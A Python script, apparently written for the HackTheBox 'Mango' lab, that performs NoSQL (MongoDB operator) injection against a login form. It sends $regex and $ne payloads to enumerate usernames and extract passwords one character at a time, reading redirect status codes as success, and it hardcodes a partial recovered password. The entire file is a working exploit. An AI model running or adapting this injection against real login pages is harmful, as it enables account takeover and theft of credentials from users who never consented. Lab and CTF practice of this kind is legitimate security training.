import requests
from colorama import Fore, Style
import string
import argparse
from urllib.parse import quote_plus
import re

URL = "http://staging-order.mango.htb"

characters = list(string.ascii_lowercase) + list(string.ascii_uppercase) + [str(i) for i in range(0, 10)]
payload = {
    "username[$regex]":"",
    "password[$ne]":"does_not_exist",
    "login":"login"
}
payload_pw = {
    "username":"",
    "password[$regex]":"",
    "login":"login"
}

session = requests.session()
session.proxies.update({'http': 'http://127.0.0.1:8080'})

users = []

def is_complete(username):
    payload["username[$regex]"] = f"^{username}$"
    r = session.post(
        URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False
    )
    return r.status_code == 302

def find_user(start="^"):
    for ch in characters:
        prefix = start + ch
        print(f"\r{Fore.YELLOW} Trying: {prefix}", end="")
        payload["username[$regex]"] = prefix 
        payload_str = "&".join("%s=%s" % (k,v) for k,v in payload.items())
        response = session.post(url=URL, data=payload_str, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False)
        if response.status_code == 302:
            if response.status_code == 302:
                if is_complete(prefix[1:]):
                    print(f"\n\n{Fore.GREEN} FOUND USER: {prefix[1:]}{Style.RESET_ALL}\n")
                    users.append(prefix[1:])
                    return
                find_user(prefix)

def is_complete_pw(password):
    payload_pw["password[$regex]"] = f"^{re.escape(password)}$"
    r = session.post(
        URL,
        data=payload_pw,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False
    )
    return r.status_code == 302

def find_password(start="^"):
    for ch in characters:  
        prefix = start + ch
        display = prefix.encode("unicode_escape").decode()
        print(f"\r{Fore.YELLOW} Trying: {display}", end="", flush=True)
        payload_pw["password[$regex]"] = "^" + re.escape(prefix[1:])
        payload_str = "&".join("%s=%s" % (k,quote_plus(v)) for k,v in payload_pw.items())
        response = session.post(url=URL, data=payload_str, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False)
        if response.status_code == 302:
            if response.status_code == 302:
                if is_complete_pw(prefix[1:]):
                    print(f"\n\n{Fore.GREEN} FOUND PASSWORD FOR USER {payload_pw['username']}: {prefix[1:]}{Style.RESET_ALL}\n")
                    return True
                if find_password(prefix):
                    return True

    return False
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="Just do password bruteforce. Use comma for multiple users")

    args = parser.parse_args()
    if not args.username:
        find_user()
    else:
        for user in args.username.split(','):
            users.append(user)
    
    for p in string.punctuation:
        characters.append(p)

    for user in users:
        payload_pw["username"] = user
        find_password("^h3mXK8RhU~f{]f5")

    print("Finished")
